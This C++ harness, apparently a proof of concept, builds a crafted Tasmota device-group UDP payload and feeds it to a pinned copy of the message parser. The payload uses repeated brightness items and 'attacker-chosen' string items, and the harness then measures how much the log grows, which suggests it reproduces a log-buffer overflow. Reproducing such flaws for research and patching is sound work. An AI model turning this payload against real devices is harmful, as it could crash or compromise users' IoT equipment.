// Drive the pinned SendReceiveDeviceGroupMessage() with a UDP-shaped payload.
// Usage: DGR_MAIN <numeric-items> [string-items]  (see run-all.sh)
#include "shim.h"

void SendReceiveDeviceGroupMessage(struct device_group *, struct device_group_member *,
                                   uint8_t *, int, bool);

static void put16(std::vector<uint8_t>& m, uint16_t v) {
  m.push_back(v & 0xff);
  m.push_back((v >> 8) & 0xff);
}

int main(int argc, char ** argv) {
  int numeric = argc > 1 ? atoi(argv[1]) : 1;
  int strings = argc > 2 ? atoi(argv[2]) : 0;
  if (numeric < 0 || numeric > 200 || strings < 0 || strings > 8) return 2;

  device_groups = (struct device_group *)calloc(1, sizeof(struct device_group));
  if (!device_groups) return 3;
  strcpy(device_groups->group_name, "g");
  device_groups->message_header_length = 13;
  device_groups->outgoing_sequence = 1;
  device_groups->last_full_status_sequence = 0xffff;
  SettingsStorage.device_group_share_in = 0xffffffff;
  SettingsStorage.device_group_share_out = 0xffffffff;

  auto member = (struct device_group_member *)calloc(1, sizeof(struct device_group_member));
  if (!member) return 4;
  member->ip_address = device_groups_udp.remoteIP();
  member->acked_sequence = 0;
  member->received_sequence = 0;
  device_groups->device_group_members = member;

  // Exact wire prefix from DeviceGroupsInit()/BeginDeviceGroupMessage():
  // "TASMOTA_DGR" + group name + NUL, then 16-bit sequence and 16-bit flags.
  std::vector<uint8_t> message;
  const char header[] = DEVICE_GROUP_MESSAGE "g";
  for (size_t i = 0; i < sizeof(header); i++) message.push_back((uint8_t)header[i]);
  put16(message, 1);   // sequence
  put16(message, 0);   // flags: ordinary update, member present -> ack recursion

  // 8-bit DGR_ITEM_LIGHT_BRI (5) items: each adds a decimal value to the log.
  for (int i = 0; i < numeric; i++) {
    message.push_back(DGR_ITEM_LIGHT_BRI);
    message.push_back(0x43);
  }
  // String items with attacker-chosen 0x44 bytes follow the numeric run.
  for (int s = 0; s < strings; s++) {
    message.push_back(DGR_ITEM_COMMAND);
    message.push_back(8);
    for (int i = 0; i < 8; i++) message.push_back(0x44);
    message.push_back(0);  // C string terminator inside the packet
  }
  message.push_back(DGR_ITEM_EOL);

  printf("DGR_MAIN numeric=%d strings=%d wire_len=%zu\n", numeric, strings, message.size());
  fflush(stdout);
  SendReceiveDeviceGroupMessage(device_groups, member, message.data(), (int)message.size(), true);
  printf("DGR_DONE log_calls=%d log_len=%zu\n", g_log_calls, strlen(g_last_log));
  return 0;
}
